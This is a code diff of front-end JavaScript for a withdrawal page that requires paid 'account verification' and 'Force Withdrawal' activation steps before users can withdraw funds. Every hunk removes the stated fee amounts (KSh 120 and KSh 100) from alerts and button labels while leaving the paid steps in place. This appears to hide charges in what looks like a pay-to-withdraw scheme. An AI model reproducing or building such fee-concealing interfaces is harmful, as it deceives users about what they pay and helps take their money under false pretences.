@@ -740,7 +740,7 @@ async function doWithdraw() {
   }
 
   if (!stats.activated) {
-    showAlert(errEl, 'Payment Account registration required. Complete the  verification below.');
+    showAlert(errEl, 'Complete the account verification below.');
     if (wdLocked) {
       wdLocked.classList.remove('hidden');
       wdLocked.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -749,7 +749,7 @@ async function doWithdraw() {
   }
 
   if (!stats.forceVerified) {
-    showAlert(errEl, 'Force Withdrawal required. Complete the KSh 100 activation below.');
+    showAlert(errEl, 'Force Withdrawal required. Complete the activation below.');
     if (wdForce) {
       wdForce.classList.remove('hidden');
       wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -805,7 +805,7 @@ async function doActivate() {
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to send prompt.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
+    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account ';
   }
 }
 
@@ -820,7 +820,7 @@ function startActivationPoll(ref) {
       clearInterval(activationPollTimer);
       if (btn) {
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
+        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account ';
       }
       return;
     }
@@ -888,7 +888,7 @@ function startForceVerifyPoll(ref, btn) {
       clearInterval(forceVerifyPollTimer);
       if (btn) {
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal ';
       }
       return;
     }
@@ -907,7 +907,7 @@ function startForceVerifyPoll(ref, btn) {
         if (errEl) showAlert(errEl, 'Activation failed. Try again.');
         if (btn) {
           btn.disabled = false;
-          btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+          btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal ';
         }
       }
     } catch (err) {
